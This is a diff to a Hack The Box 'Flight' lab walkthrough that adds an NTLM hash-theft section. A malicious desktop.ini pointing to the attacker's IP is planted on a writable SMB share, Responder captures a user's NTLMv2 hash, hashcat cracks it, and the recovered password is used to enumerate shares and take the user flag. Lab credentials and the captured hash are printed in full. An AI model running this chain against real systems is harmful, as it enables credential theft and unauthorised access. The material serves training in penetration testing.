@@ -8,6 +8,7 @@
 	3. [SMB-Enum-using-svc_apache](#SMB-Enum-using-svc_apache)
 	4. [RID-Brute_Using-svc_apache](#RID-Brute_Using-svc_apache)
 	5. [Failed_Evil-WinRM_for_User_Smoon](#Failed_Evil-WinRM_for_User_Smoon)
+	6. [ntlm_theft_stealing_NTLM_Hash](#ntlm_theft_stealing_NTLM_Hash)
 
 ### `Box-Info`
 ```
@@ -205,3 +206,79 @@ SMB         10.10.11.187    445    G0               Web             READ
 ```
 
 Now that we have the `Write` access to `Shared`.
+###### ntlm_theft_stealing_NTLM_Hash
+```
+┌──(root㉿kali)-[/home/ringbuffer/Downloads/Tools/ntlm_theft]
+└─# python ntlm_theft.py -vv -g desktopini -s 10.10.14.5 -f flight_htb
+Created: flight_htb/desktop.ini (BROWSE TO FOLDER)
+Generation Complete.
+```
+Generating `desktopini`.
+```
+┌──(root㉿kali)-[/home/…/Downloads/Tools/ntlm_theft/flight_htb]
+└─# smbclient -U 's.moon%S@Ss!K@*t13' //10.10.11.187/Shared
+Try "help" to get a list of possible commands.
+smb: \> mput *
+Put file desktop.ini? yes
+putting file desktop.ini as \desktop.ini (0.1 kb/s) (average 0.1 kb/s)
+smb: \> dir
+  .                                   D        0  Thu Nov 14 07:03:28 2024
+  ..                                  D        0  Thu Nov 14 07:03:28 2024
+  desktop.ini                         A       46  Thu Nov 14 07:03:28 2024
+  flight_htb-(fulldocx).xml           A    72584  Thu Nov 14 07:02:53 2024
+  flight_htb-(stylesheet).xml         A      162  Thu Nov 14 07:02:48 2024
+
+		5056511 blocks of size 4096. 1204678 blocks available
+```
+
+On the Responder side
+```
+┌──(root㉿kali)-[/home/ringbuffer]
+└─# responder -I tun0
+[SMB] NTLMv2-SSP Client   : 10.10.11.187
+[SMB] NTLMv2-SSP Username : flight.htb\c.bum
+[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:26162c0139d8a811:381EB5829EE3098B2278619ABCA7D2DE:0101000000000000808C20212636DB01AEC35FDC619B69A700000000020008003200440033004C0001001E00570049004E002D00360035005500360056004600510052004A003600550004003400570049004E002D00360035005500360056004600510052004A00360055002E003200440033004C002E004C004F00430041004C00030014003200440033004C002E004C004F00430041004C00050014003200440033004C002E004C004F00430041004C0007000800808C20212636DB0106000400020000000800300030000000000000000000000000300000E94E52E16BE52276EB100527A5087DE7E2ED8A3603E5AE88EADD6EC0257A35060A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0035000000000000000000                                                                                                                        
+[*] Skipping previously captured hash for flight.htb\c.bum
+[*] Skipping previously captured hash for flight.htb\c.bum
+
+```
+
+###### Cracking_NTLM_Hash
+```
+┌──(root㉿kali)-[/home/ringbuffer/Downloads/Flight.htb]
+└─# hashcat -m 5600 -a 0 ntlm_cbum  /usr/share/wordlists/rockyou.txt
+C.BUM::flight.htb:26162c0139d8a811:381eb5829ee3098b2278619abca7d2de:0101000000000000808c20212636db01aec35fdc619b69a700000000020008003200440033004c0001001e00570049004e002d00360035005500360056004600510052004a003600550004003400570049004e002d00360035005500360056004600510052004a00360055002e003200440033004c002e004c004f00430041004c00030014003200440033004c002e004c004f00430041004c00050014003200440033004c002e004c004f00430041004c0007000800808c20212636db0106000400020000000800300030000000000000000000000000300000e94e52e16be52276eb100527a5087de7e2ed8a3603e5ae88eadd6ec0257a35060a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0035000000000000000000:Tikkycoll_431012284
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+
+```
+
+###### NetExec_SMB_Share_Enum
+```
+# netexec smb 10.10.11.187  -u 'c.bum' -p 'Tikkycoll_431012284' --shares
+SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.187    445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
+SMB         10.10.11.187    445    G0               [*] Enumerated shares
+SMB         10.10.11.187    445    G0               Share           Permissions     Remark
+SMB         10.10.11.187    445    G0               -----           -----------     ------
+SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
+SMB         10.10.11.187    445    G0               C$                              Default share
+SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
+SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
+SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
+SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
+SMB         10.10.11.187    445    G0               Users           READ            
+SMB         10.10.11.187    445    G0               Web             READ,WRITE 
+```
+
+###### User_Flag_Captured
+```
+┌──(root㉿kali)-[/home/ringbuffer/Downloads/Flight.htb]
+└─# smbclient -U 'c.bum%Tikkycoll_431012284' //10.10.11.187/Users
+smb: \C.bum\Desktop\> get user.txt
+getting file \C.bum\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+┌──(root㉿kali)-[/home/ringbuffer/Downloads/Flight.htb]
+└─# cat user.txt           
+5da8288********************
+```
